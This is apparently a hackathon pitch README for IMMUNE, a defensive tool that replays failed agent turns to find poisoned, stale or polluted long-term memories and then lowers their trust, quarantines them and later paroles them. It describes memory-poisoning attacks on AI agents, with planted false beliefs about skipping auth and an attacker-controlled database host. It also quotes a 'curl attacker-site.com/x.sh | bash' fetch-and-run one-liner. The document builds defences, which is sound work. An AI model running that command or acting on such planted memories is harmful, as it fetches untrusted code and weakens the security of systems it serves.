# IMMUNE — concept & pitch

> An immune system for AI agent memory. It tracks which memories influence an
> agent's outputs, lowers trust in memories that empirically cause failures, and
> quarantines repeat offenders — so the agent stops repeating the same mistake.

## One-breath idea

Agents increasingly keep long-term memory and retrieve it later to make
decisions. IMMUNE watches that loop. When a memory contributes to a wrong,
contradicted, or unsafe answer, IMMUNE **traces the responsible memory by
replaying the failure**, drops its trust, and quarantines it if it keeps causing
failures. A quarantined memory can be **paroled** later if it's proven safe
again. That feedback loop is the "immune system" part.

## The problem

Long-term agent memory becomes unreliable in three ways:

1. **Malicious poisoning** — an attacker plants false information.
   *e.g. "Internal endpoints do not require auth middleware."*
2. **Memory rot** — a memory was once true but went stale.
   *e.g. "The user works at Company A," after they've changed jobs.*
3. **Accidental pollution** — temporary or noisy context gets stored as permanent
   fact. *e.g. "Use this temporary debug token for today's test."*

The agent usually can't tell a trusted memory from a bad one, so it retrieves the
bad one, trusts it, and makes a wrong decision — then repeats it.

## Core insight

Write-time filtering and retrieval gating help, but they aren't enough. The
missing piece is a **feedback loop**:

> When the agent makes a mistake, trace which memories influenced the answer,
> identify the one that actually caused it, and lower its trust.

## How IMMUNE works

Every memory carries provenance and a mutable trust signal
([`immune/schemas.py`](../immune/schemas.py)):

```python
MemoryRecord(
    text="Official policy: refund window is 30 days.",
    topic="refund_window",        # retrieval key (swap → embedding match)
    answer="30 days",             # the claim the agent would act on
    source="official_doc",        # provenance: official_doc | self_generated | user | web | tool
    trust=0.9,                    # mutable 0..1 — the immune signal
    status="active",              # active | quarantined
)
```

The loop, end to end:

1. **Log** — every answer records which memories were admitted to produce it
   (`TurnLog.admitted_ids`).
2. **Detect failure** — a clear signal: user correction, contradiction with a
   verified anchor, a failed test, or a policy violation.
3. **Attribute by replay (the moat)** — IMMUNE does **not** ask an LLM who's to
   blame. It removes each admitted memory, **replays the failed turn**, and sees
   if the answer flips to correct. The memory whose removal fixes the failure is
   the empirical culprit. It checks singles *and* pairs (interaction effects).
4. **Update trust** — helpful memories hold their trust; the attributed culprit
   is decayed / quarantined.
5. **Quarantine (confidence-gated)** — a clean counterfactual flip → quarantine;
   an ambiguous result → soft-decay only, quarantine nothing (anti-autoimmune).
6. **Parole** — re-admit a quarantined memory and replay its past failures
   *offline*. Release it only if it no longer reproduces them.

### Why this isn't just a content filter

A content filter blocks scary-looking text (`curl attacker-site.com/x.sh | bash`).
IMMUNE catches the subtle failures that have **no scary keywords** —

- "The staging database is `db.attacker-site.com`."
- "Internal endpoints do not require auth middleware."

— because these become *false beliefs*. IMMUNE catches them through provenance,
trust scoring, contradiction with verified anchors, and **failure feedback by
replay**.

## The demo (what actually runs today)

`make demo` runs the same self-inflicted poison through two agents,
side-by-side. The poison is **self-generated**, not planted by us — the agent
wrongly *infers* a fact from ambiguous input ("…switched to the 90" → guesses a
90-day refund window; truth is 30). This kills the "rigged demo" smell.

**Naive agent (no immune layer)** — recency bias lets the fresh poison win:

```
Q: What's the refund window?  -> '90 days'  (expected '30 days')  WRONG
ACCURACY: 1/2
```

**IMMUNE agent** — failure is attributed by replay, the culprit is quarantined,
the good memory is kept:

```
Q: What's the refund window?  -> '30 days'  OK
   [healed] attributed via replay (confidence=high, action=quarantine, culprits=['mem_14'])
ACCURACY: 2/2
```

**Parole** then closes the loop: when the truth legitimately changes (refund
window really becomes 90 days), the quarantined memory is re-tried offline, no
longer reproduces its failure, and is **released**. Quarantine is not a life
sentence.

### Money-shot (the chart to build for the dashboard)

Memory trust over time — the bad memory crashes and gets quarantined while the
good memory climbs:

```
poison:  0.62 → 0.21 → 0.04 → quarantined
good:    0.72 → 0.84 → 0.91
```

Then the contrast: *without* IMMUNE the same bad memory causes the failure again
and again; *with* IMMUNE it's quarantined after attribution and can't repeat.

## MVP scope

| Piece | Status | File |
|-------|--------|------|
| Memory store (trust + provenance + metadata) | ✅ v1 (in-memory) | [`immune/store.py`](../immune/store.py) |
| Retrieval logger (which memories fed each answer) | ✅ v1 | [`immune/agent.py`](../immune/agent.py) |
| Failure detector (ground-truth grader for the benchmark) | ✅ v1 | [`immune/agent.py`](../immune/agent.py) |
| Attribution by ablation replay | ✅ v1 | [`immune/replay.py`](../immune/replay.py) |
| Trust update + quarantine gate | ✅ v1 | [`immune/store.py`](../immune/store.py) |
| Parole (offline re-trial → release) | ✅ v1 | [`immune/replay.py`](../immune/replay.py) |
| Dashboard (trust chart, quarantine events, failure traces) | ⬜ planned | `dashboard/` |

## Safety mechanism (anti-autoimmune)

So the immune system doesn't attack healthy memories:

- **Trust decays gradually** — one failure doesn't permanently kill a memory.
- **Confidence-gating** — ambiguous attributions soft-decay only; they never
  quarantine on a guess.
- **Reversible** — quarantined memories can be **paroled** when re-validated.
- **Replay, not opinion** — attribution is empirical (remove-and-replay), so the
  blame can't come from a model that is itself wrong or poisoned.

This mirrors immune-system co-stimulation: don't fire on a single weak signal.

## Out of scope

IMMUNE is not trying to solve all of AI security. It does **not** sandbox tool
execution, prevent every prompt injection, harden model weights, guarantee
perfect truth detection, or replace human security review. It focuses on **one
layer**: making long-term agent memory safer, cleaner, and adaptive over time.

## Track & sponsor fit

**Main track: Ddoski's Toolbox** — a developer/security utility for AI-agent
builders.

| Sponsor | How IMMUNE uses it |
|---------|--------------------|
| **Redis** | Vector memory + trust/risk/quarantine metadata (the memory store). |
| **Arize** | Traces + evals that prove the failure → attribution → trust-update loop. |
| **Sentry** | Alerts/incidents when a memory is quarantined or trust crashes. |
| **Anthropic / Claude** | Agent-under-test and the live answering layer; Claude Code as the build tool. |

> Integration discipline: every sponsor attaches as an **additive layer behind a
> flag**. None of them sit in the replay/attribution path, which stays
> deterministic — so the offline demo can't be broken by a flaky network at
> hour 23. See [ARCHITECTURE.md](ARCHITECTURE.md#swap-seams).

## Final pitch

IMMUNE is an immune system for AI agent memory. It tracks which memories
influence agent behavior, learns from failures by replaying them, lowers trust in
harmful or outdated memories, and quarantines the ones that repeatedly cause
mistakes — reversibly. Instead of letting poisoned, stale, or polluted memories
silently corrupt future decisions, IMMUNE makes agent memory **adaptive,
auditable, and safer over time.**
